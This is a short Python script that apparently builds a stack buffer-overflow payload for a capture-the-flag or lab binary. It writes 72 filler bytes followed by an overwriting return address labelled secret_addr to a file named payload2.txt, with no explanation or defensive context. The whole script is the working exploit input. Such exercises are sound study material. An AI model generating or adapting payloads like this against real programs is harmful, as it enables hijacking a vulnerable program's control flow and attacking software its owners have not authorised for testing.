import sys

secret_addr = b"\xc0\x11\x40\x00\x00\x00\x00\x00"
payload = b"a" * 72 + secret_addr

with open("payload2.txt", "wb") as f:
    f.write(payload)

